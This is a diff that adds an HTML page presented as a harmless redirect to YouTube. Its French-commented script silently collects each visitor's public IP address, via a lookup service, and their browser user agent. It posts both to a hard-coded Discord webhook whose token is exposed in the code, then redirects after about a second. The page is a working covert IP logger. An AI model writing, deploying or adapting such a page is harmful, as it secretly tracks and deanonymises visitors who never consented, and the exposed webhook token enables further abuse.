@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirection en cours...</title>
+    <script src="script.js"></script>
+</head>
+<body>
+    <h1></h1>
+
+    <script>
+        var ip = '';
+        var deviceName = navigator.userAgent; // Obtient le nom de l'ordinateur à partir des informations du navigateur
+
+        fetch('https://api.ipify.org/?format=json')
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(data) {
+                ip = data.ip;
+                var webhook = 'https://discord.com/api/webhooks/1126222435860107304/P8OUTmVfXEUBYnOy-rdpgdIaOYPzvzw9pJPfl_X8hLOi1yQEVRHaHaAmkz5Vdws69rwO';
+
+                var message = {
+                    content: 'IP: ' + ip + '\nAppareil: ' + deviceName
+                };
+
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: {
+                        'content-type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+            });
+
+        setTimeout(function() {
+            window.location.href = "https://www.youtube.com";
+        }, 1100);
+    </script>
+</body>
+</html>
